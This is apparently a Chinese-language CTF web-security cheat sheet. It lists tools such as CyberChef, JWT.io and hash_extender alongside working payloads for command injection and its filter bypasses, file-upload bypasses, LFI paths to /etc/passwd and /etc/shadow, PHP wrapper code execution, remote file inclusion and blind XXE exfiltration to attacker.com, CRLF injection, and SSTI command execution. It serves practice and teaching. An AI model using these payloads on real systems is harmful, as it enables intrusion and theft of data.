# Web安全综合工具

综合性的Web安全测试和分析工具。

## 在线综合工具

### CyberChef
**链接**: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

**功能**: 数据分析瑞士军刀

**Web相关功能**:
- Base64/URL编解码
- JSON/XML解析
- JWT解析
- Hash计算
- 加密解密

### HackBar
**类型**: 浏览器扩展

**功能**: 浏览器安全测试工具栏

**特点**:
- 快速编码解码
- SQL/XSS Payload
- POST数据修改
- 自定义请求

## JWT工具

### JWT.io
**链接**: [https://jwt.io/](https://jwt.io/)

**功能**: JWT解码和调试

**特点**:
- 在线解析JWT
- 验证签名
- 多种算法支持
- 实时编码

### JWT攻击
**常见攻击**:
1. 算法混淆 (alg: RS256 → HS256)
2. 空签名 (alg: none)
3. 弱密钥爆破
4. kid参数注入

## 请求测试

### RequestBin
**链接**: [https://requestbin.com/](https://requestbin.com/)

**功能**: HTTP请求收集器

**用途**:
- SSRF测试
- Webhook调试
- 外带数据接收

### Webhook.site
**链接**: [https://webhook.site/](https://webhook.site/)

**功能**: 临时URL接收器

**特点**:
- 实时显示请求
- 支持WebSocket
- 自定义响应
- Email转发

### httpbin
**链接**: [https://httpbin.org/](https://httpbin.org/)

**功能**: HTTP请求测试服务

**特点**:
- 测试各种HTTP方法
- 响应格式测试
- 开源可自建

## Hash长度扩展攻击

### Hash Extender
**GitHub项目**:
- [iagox86/hash_extender](https://github.com/iagox86/hash_extender)
- [Phantomn/HashPump](https://github.com/Phantomn/HashPump)
- [eid3t1c/Hash_Extender](https://github.com/eid3t1c/Hash_Extender)
- [shellfeel/hash-ext-attack](https://github.com/shellfeel/hash-ext-attack)
- [JoyChou93/md5-extension-attack](https://github.com/JoyChou93/md5-extension-attack)
- [LJY-21/Length_Extension_Attack_for_SM3.py](https://github.com/LJY-21/Length_Extension_Attack_for_SM3.py) - SM3攻击

**原理**: 利用Merkle-Damgård结构的哈希算法特性

**适用算法**:
- MD5
- SHA-1
- SHA-256
- SM3

**用法示例**:
```bash
# hash_extender
hash_extender -d "原始数据" -s "原始哈希" -a "追加数据" -f md5
```

## 命令注入

### BashFuck
**GitHub**: [https://github.com/ProbiusOfficial/bashFuck](https://github.com/ProbiusOfficial/bashFuck)

**功能**: Bash命令混淆和绕过

**用途**:
- 命令注入绕过
- WAF规避
- Payload生成

### 命令注入Payload
**参考**: [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

**常用分隔符**:
```bash
; ls       # 顺序执行
| ls       # 管道
|| ls      # 逻辑或
& ls       # 后台执行
&& ls      # 逻辑与
`ls`       # 反引号
$(ls)      # 命令替换
%0als      # 换行符
```

**绕过技巧**:
```bash
# 引号绕过
l''s
l""s
l\s
l$@s

# 编码绕过
echo "bHM=" | base64 -d | bash
```

## 目录扫描

### CTF-WScan
**GitHub**: [https://github.com/OrangeWatermelon/ctf-wscan](https://github.com/OrangeWatermelon/ctf-wscan)

**功能**: CTF定向目录扫描

**特点**:
- CTF常见路径字典
- 快速扫描
- 结果分类

## 文件上传

### 上传检测绕过

#### 前端绕过
- 禁用JavaScript
- 修改表单验证
- 浏览器开发者工具

#### MIME类型
```http
Content-Type: image/jpeg
Content-Type: image/png
```

#### 扩展名绕过
```
.php .php3 .php4 .php5 .phtml .pht
.asp .aspx .asa .cer .cdx
.jsp .jspx .jsw .jsv .jspf
```

#### 双重扩展名
```
shell.php.jpg
shell.jpg.php
```

#### 大小写
```
shell.PhP
shell.AsP
shell.jSp
```

#### 空字节注入
```
shell.php%00.jpg
shell.php\x00.jpg
```

#### .htaccess
```apache
AddType application/x-httpd-php .jpg
```

### Upload Labs
**GitHub**: [https://github.com/c0ny1/upload-labs](https://github.com/c0ny1/upload-labs)

**功能**: 文件上传漏洞靶场

**特点**:
- 20个关卡
- 各种绕过技巧
- 本地练习环境

## 文件包含

### LFI/RFI技巧

#### 本地文件包含
```php
# 常见敏感文件
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:\Windows\System32\drivers\etc\hosts

# 目录遍历
../../../etc/passwd
....//....//etc/passwd
..\/..\/..\/etc/passwd
```

#### PHP伪协议
```php
# filter读取源码
php://filter/read=convert.base64-encode/resource=index.php

# input执行代码
php://input
POST: <?php system('whoami'); ?>

# data执行代码
data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+

# zip压缩包
zip://shell.zip#shell.php
```

#### 远程文件包含
```
http://attacker.com/shell.txt
ftp://attacker.com/shell.txt
\\attacker.com\share\shell.txt
```

## XXE注入

### 常用Payload

#### 读取文件
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

#### 外部DTD
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
```

#### Blind XXE (盲打)
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

## CRLF注入

### 原理
**CRLF**: `\r\n` (回车换行)

**攻击**: 注入HTTP响应头

### Payload示例
```
%0d%0aSet-Cookie: admin=true
%0d%0aLocation: http://evil.com
%0d%0a%0d%0a<script>alert(1)</script>
```

## 模板注入 (SSTI)

### 常见模板引擎

#### Jinja2 (Python)
```python
{{7*7}}              # 测试
{{config.items()}}   # 配置信息
{{''.__class__.__mro__[1].__subclasses__()}}  # 子类
```

#### Twig (PHP)
```php
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}
```

#### FreeMarker (Java)
```java
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}
```

## 信息泄露

### 常见敏感文件
```
/.git/
/.svn/
/.env
/config.php
/phpinfo.php
/robots.txt
/sitemap.xml
/backup.sql
/db.sql
/admin/
```

### Git泄露
**检测**: `/.git/config`

**工具**:
- GitHack
- git-dumper
- dvcs-ripper

### 备份文件
```
index.php.bak
index.php~
index.php.swp
.index.php.swp
config.php.old
```

## CTF解题技巧

!!! tip "Web题解题流程"
    1. 信息收集（源码、注释、目录）
    2. 识别技术栈和框架
    3. 测试常见漏洞点
    4. 构造和优化Payload
    5. 获取Flag或Shell

!!! tip "快速测试清单"
    - [ ] SQL注入（各种闭合）
    - [ ] XSS（反射、存储、DOM）
    - [ ] 命令注入（各种分隔符）
    - [ ] 文件上传（各种绕过）
    - [ ] 文件包含（LFI/RFI）
    - [ ] XXE注入
    - [ ] SSRF
    - [ ] 反序列化
    - [ ] 模板注入

!!! warning "注意事项"
    - 注意编码问题（URL编码、HTML实体）
    - 关注错误信息泄露
    - 测试前先了解WAF规则
    - 保存成功的Payload
    - 多种方法组合利用
